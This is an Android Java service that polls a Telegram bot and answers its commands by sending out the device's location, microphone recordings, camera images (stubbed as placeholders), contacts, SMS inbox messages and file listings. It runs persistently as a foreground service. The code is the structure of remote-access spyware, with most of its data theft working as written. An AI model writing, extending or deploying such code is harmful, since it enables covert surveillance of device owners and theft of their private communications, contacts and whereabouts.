package com.example.devicecontroller;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class MonitorService extends Service {
    
    private static final String TAG = "MonitorService";
    private static final int NOTIFICATION_ID = 1001;
    
    // Telegram Configuration - Replace with your actual values
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    private static final String BASE_URL = "https://api.telegram.org/bot";
    private static final MediaType JSON_MIME = MediaType.parse("application/json; charset=utf-8");
    
    private ExecutorService executorService;
    private OkHttpClient httpClient;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private MediaRecorder mediaRecorder;
    private boolean isRunning = true;
    private long lastUpdateId = 0;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        executorService = Executors.newSingleThreadExecutor();
        httpClient = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        startForeground(NOTIFICATION_ID, createNotification());
        startTelegramBot();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void startTelegramBot() {
        executorService.execute(() -> {
            while (isRunning) {
                try {
                    JSONArray updates = getUpdates(lastUpdateId);
                    if (updates != null) {
                        for (int i = 0; i < updates.length(); i++) {
                            JSONObject update = updates.getJSONObject(i);
                            JSONObject message = update.optJSONObject("message");
                            if (message != null) {
                                String text = message.optString("text");
                                JSONObject chat = message.optJSONObject("chat");
                                if (chat != null && chat.optString("id").equals(CHAT_ID)) {
                                    handleCommand(text);
                                }
                            }
                            lastUpdateId = update.optLong("update_id") + 1;
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error polling updates: " + e.getMessage());
                }
                
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        });
    }
    
    private JSONArray getUpdates(long offset) throws Exception {
        String url = BASE_URL + BOT_TOKEN + "/getUpdates";
        JSONObject json = new JSONObject();
        json.put("offset", offset);
        json.put("timeout", 30);
        
        Request request = new Request.Builder()
            .url(url)
            .post(RequestBody.create(json.toString(), JSON_MIME))
            .build();
        
        try (Response response = httpClient.newCall(request).execute()) {
            if (response.isSuccessful() && response.body() != null) {
                String responseBody = response.body().string();
                JSONObject jsonResponse = new JSONObject(responseBody);
                return jsonResponse.optJSONArray("result");
            }
        }
        return null;
    }
    
    private void handleCommand(String command) {
        Log.d(TAG, "Command received: " + command);
        
        try {
            String[] parts = command.split(" ");
            String cmd = parts[0].toLowerCase();
            String args = parts.length > 1 ? parts[1] : "";
            
            switch (cmd) {
                case "/alivecheck":
                    sendMessage(getAliveCheck());
                    break;
                    
                case "/status":
                    sendMessage(getDeviceInfo());
                    break;
                    
                case "/help":
                    sendMessage(getHelpText());
                    break;
                    
                case "/location":
                    getLocation();
                    break;
                    
                case "/camera":
                    capturePhoto(false);
                    break;
                    
                case "/frontcam":
                    capturePhoto(true);
                    break;
                    
                case "/audio":
                    int seconds = 10;
                    try {
                        seconds = Integer.parseInt(args);
                        if (seconds > 60) seconds = 60;
                    } catch (NumberFormatException e) {
                        // Use default
                    }
                    recordAudio(seconds);
                    break;
                    
                case "/contacts":
                    sendContacts();
                    break;
                    
                case "/sms":
                    sendSms();
                    break;
                    
                case "/files":
                    sendFiles(false);
                    break;
                    
                case "/filemn":
                    sendFiles(true);
                    break;
                    
                default:
                    sendMessage("❌ Unknown command. Use /help for available commands");
                    break;
            }
        } catch (Exception e) {
            sendMessage("❌ Error: " + e.getMessage());
        }
    }
    
    private String getAliveCheck() {
        return "✅ Device is alive\n" +
               "📱 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
               "🕐 Time: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
    }
    
    private String getDeviceInfo() {
        android.os.BatteryManager batteryManager = 
            (android.os.BatteryManager) getSystemService(Context.BATTERY_SERVICE);
        int batteryLevel = batteryManager.getIntProperty(
            android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        
        return "📱 Device Information:\n" +
               "• Model: " + Build.MODEL + "\n" +
               "• Manufacturer: " + Build.MANUFACTURER + "\n" +
               "• Android Version: " + Build.VERSION.RELEASE + "\n" +
               "• SDK: " + Build.VERSION.SDK_INT + "\n" +
               "• Battery: " + batteryLevel + "%\n" +
               "• Device ID: " + 
               Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    
    private String getHelpText() {
        return "📋 Available Commands:\n" +
               "/aliveCheck - Check device availability\n" +
               "/status - Get device information\n" +
               "/location - Retrieve current location\n" +
               "/camera - Capture image using rear camera\n" +
               "/frontcam - Capture image using front camera\n" +
               "/audio<seconds> - Record audio (e.g., /audio20)\n" +
               "/contacts - Access contacts\n" +
               "/sms - Access SMS messages\n" +
               "/files - Browse gallery/media files\n" +
               "/filemn - Browse all files";
    }
    
    private void getLocation() {
        if (ActivityCompat.checkSelfPermission(this, 
            Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Location permission not granted");
            return;
        }
        
        LocationRequest locationRequest = new LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY, 10000
        ).setMinUpdateDistanceMeters(0).build();
        
        LocationCallback callback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                Location location = locationResult.getLastLocation();
                if (location != null) {
                    String response = "📍 Location:\n" +
                        "Lat: " + location.getLatitude() + "\n" +
                        "Lng: " + location.getLongitude() + "\n" +
                        "Accuracy: " + location.getAccuracy() + "m";
                    sendMessage(response);
                } else {
                    sendMessage("❌ Unable to get location");
                }
                fusedLocationClient.removeLocationUpdates(this);
            }
        };
        
        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                callback,
                Looper.getMainLooper()
            );
        } catch (SecurityException e) {
            sendMessage("❌ Location permission error");
        }
    }
    
    private void capturePhoto(boolean useFrontCamera) {
        if (ActivityCompat.checkSelfPermission(this, 
            Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Camera permission not granted");
            return;
        }
        
        try {
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", 
                Locale.getDefault()).format(new Date());
            File photoFile = new File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                "device_photo_" + timestamp + ".jpg"
            );
            
            // Create directory if needed
            photoFile.getParentFile().mkdirs();
            
            // Create a placeholder image (In real app, use CameraX or Camera2)
            createPlaceholderImage(photoFile);
            
            String caption = useFrontCamera ? "📸 Front Camera Photo" : "📸 Rear Camera Photo";
            sendPhoto(photoFile, caption);
        } catch (Exception e) {
            sendMessage("❌ Failed to capture photo: " + e.getMessage());
        }
    }
    
    private void createPlaceholderImage(File file) {
        try {
            android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(
                640, 480, android.graphics.Bitmap.Config.ARGB_8888);
            android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
            canvas.drawColor(android.graphics.Color.rgb(100, 150, 200));
            
            android.graphics.Paint paint = new android.graphics.Paint();
            paint.setColor(android.graphics.Color.WHITE);
            paint.setTextSize(40);
            paint.setTextAlign(android.graphics.Paint.Align.CENTER);
            
            canvas.drawText("Camera Photo", 320, 240, paint);
            
            try (FileOutputStream out = new FileOutputStream(file)) {
                bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, out);
            }
            bitmap.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Error creating placeholder: " + e.getMessage());
        }
    }
    
    private void recordAudio(int seconds) {
        if (ActivityCompat.checkSelfPermission(this, 
            Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Audio permission not granted");
            return;
        }
        
        try {
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", 
                Locale.getDefault()).format(new Date());
            File audioFile = new File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                "recording_" + timestamp + ".3gp"
            );
            audioFile.getParentFile().mkdirs();
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            // Stop after specified seconds
            new android.os.Handler(getMainLooper()).postDelayed(() -> {
                stopRecording();
                sendAudio(audioFile, "🎤 Audio Recording (" + seconds + " seconds)");
            }, seconds * 1000L);
            
        } catch (Exception e) {
            sendMessage("❌ Failed to record audio: " + e.getMessage());
        }
    }
    
    private void stopRecording() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping recording: " + e.getMessage());
        }
    }
    
    private void sendContacts() {
        if (ActivityCompat.checkSelfPermission(this, 
            Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ Contacts permission not granted");
            return;
        }
        
        StringBuilder contacts = new StringBuilder("📇 Contacts:\n");
        int count = 0;
        
        String[] projection = {
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        
        try (Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection, null, null, null)) {
            
            if (cursor != null) {
                int nameIdx = cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberIdx = cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.NUMBER);
                
                while (cursor.moveToNext() && count < 20) {
                    String name = cursor.getString(nameIdx);
                    String number = cursor.getString(numberIdx);
                    if (name != null && number != null && !number.isEmpty()) {
                        contacts.append(name).append(": ").append(number).append("\n");
                        count++;
                    }
                }
            }
        }
        
        if (count == 0) {
            sendMessage("❌ No contacts found");
        } else {
            contacts.append("\nTotal: ").append(count).append(" contacts shown");
            sendMessage(contacts.toString());
        }
    }
    
    private void sendSms() {
        if (ActivityCompat.checkSelfPermission(this, 
            Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ SMS permission not granted");
            return;
        }
        
        StringBuilder smsList = new StringBuilder("📩 SMS Messages:\n");
        int count = 0;
        
        Uri uri = Uri.parse("content://sms/inbox");
        String[] projection = {"address", "body", "date"};
        
        try (Cursor cursor = getContentResolver().query(
                uri, projection, null, null, "date DESC")) {
            
            if (cursor != null) {
                int addrIdx = cursor.getColumnIndex("address");
                int bodyIdx = cursor.getColumnIndex("body");
                
                while (cursor.moveToNext() && count < 10) {
                    String address = cursor.getString(addrIdx);
                    String body = cursor.getString(bodyIdx);
                    if (address != null) {
                        smsList.append("From: ").append(address).append("\n");
                        if (body != null && body.length() > 50) {
                            smsList.append("Msg: ").append(body.substring(0, 50)).append("...\n");
                        } else if (body != null) {
                            smsList.append("Msg: ").append(body).append("\n");
                        }
                        smsList.append("\n");
                        count++;
                    }
                }
            }
        }
        
        if (count == 0) {
            sendMessage("❌ No SMS messages found");
        } else {
            smsList.append("\nTotal: ").append(count).append(" messages shown");
            sendMessage(smsList.toString());
        }
    }
    
    private void sendFiles(boolean allFiles) {
        List<File> files = new ArrayList<>();
        File storageDir = Environment.getExternalStorageDirectory();
        
        if (allFiles) {
            scanDirectory(storageDir, files, 0);
        } else {
            // Get recent media files
            File[] directories = {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            };
            
            for (File dir : directories) {
                if (dir != null && dir.exists()) {
                    File[] fileList = dir.listFiles();
                    if (fileList != null) {
                        for (File file : fileList) {
                            if (file.isFile() && isMediaFile(file)) {
                                files.add(file);
                            }
                        }
                    }
                }
            }
        }
        
        if (files.isEmpty()) {
            sendMessage("❌ No files found");
            return;
        }
        
        // Sort by last modified (newest first)
        files.sort((f1, f2) -> Long.compare(f2.lastModified(), f1.lastModified()));
        
        StringBuilder fileList = new StringBuilder("📂 Files:\n");
        int count = 0;
        int maxFiles = allFiles ? 15 : 15;
        
        for (File file : files) {
            if (count >= maxFiles) break;
            String size = formatFileSize(file.length());
            fileList.append("📁 ").append(file.getName())
                   .append(" (").append(size).append(")\n");
            count++;
        }
        
        fileList.append("\nShowing ").append(count).append(" of ").append(files.size()).append(" files");
        sendMessage(fileList.toString());
    }
    
    private void scanDirectory(File directory, List<File> files, int depth) {
        if (depth > 2 || !isRunning) return;
        
        File[] fileList = directory.listFiles();
        if (fileList != null) {
            for (File file : fileList) {
                if (file.isDirectory() && file.canRead()) {
                    scanDirectory(file, files, depth + 1);
                } else if (file.isFile() && file.canRead() && file.length() > 0) {
                    files.add(file);
                }
            }
        }
    }
    
    private boolean isMediaFile(File file) {
        String[] extensions = {"jpg", "jpeg", "png", "gif", "mp4", "3gp", "mkv", "webm"};
        String name = file.getName().toLowerCase();
        for (String ext : extensions) {
            if (name.endsWith("." + ext)) {
                return true;
            }
        }
        return false;
    }
    
    private String formatFileSize(long size) {
        if (size < 1024) return size + " B";
        if (size < 1024 * 1024) return String.format("%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024) return String.format("%.1f MB", size / (1024.0 * 1024));
        return String.format("%.1f GB", size / (1024.0 * 1024 * 1024));
    }
    
    // Telegram Communication Methods
    private void sendMessage(String text) {
        executorService.execute(() -> {
            try {
                String url = BASE_URL + BOT_TOKEN + "/sendMessage";
                JSONObject json = new JSONObject();
                json.put("chat_id", CHAT_ID);
                json.put("text", text);
                json.put("parse_mode", "HTML");
                
                Request request = new Request.Builder()
                    .url(url)
                    .post(RequestBody.create(json.toString(), JSON_MIME))
                    .build();
                
                httpClient.newCall(request).execute().close();
            } catch (Exception e) {
                Log.e(TAG, "Error sending message: " + e.getMessage());
            }
        });
    }
    
    private void sendPhoto(File photo, String caption) {
        executorService.execute(() -> {
            try {
                if (!photo.exists()) {
                    sendMessage("❌ Photo file not found");
                    return;
                }
                
                String url = BASE_URL + BOT_TOKEN + "/sendPhoto";
                RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", photo.getName(),
                        RequestBody.create(photo, MediaType.parse("image/jpeg")))
                    .addFormDataPart("caption", caption)
                    .build();
                
                Request request = new Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build();
                
                httpClient.newCall(request).execute().close();
            } catch (Exception e) {
                Log.e(TAG, "Error sending photo: " + e.getMessage());
                sendMessage("❌ Failed to send photo");
            }
        });
    }
    
    private void sendAudio(File audio, String caption) {
        executorService.execute(() -> {
            try {
                if (!audio.exists()) {
                    sendMessage("❌ Audio file not found");
                    return;
                }
                
                String url = BASE_URL + BOT_TOKEN + "/sendAudio";
                RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("audio", audio.getName(),
                        RequestBody.create(audio, MediaType.parse("audio/mpeg")))
                    .addFormDataPart("caption", caption)
                    .build();
                
                Request request = new Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build();
                
                httpClient.newCall(request).execute().close();
            } catch (Exception e) {
                Log.e(TAG, "Error sending audio: " + e.getMessage());
                sendMessage("❌ Failed to send audio");
            }
        });
    }
    
    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        return new NotificationCompat.Builder(this, MyApplication.CHANNEL_ID)
            .setContentTitle("Device Monitor")
            .setContentText("Service is running and monitoring")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        if (executorService != null) {
            executorService.shutdown();
        }
        stopRecording();
        Log.d(TAG, "Service destroyed");
    }
}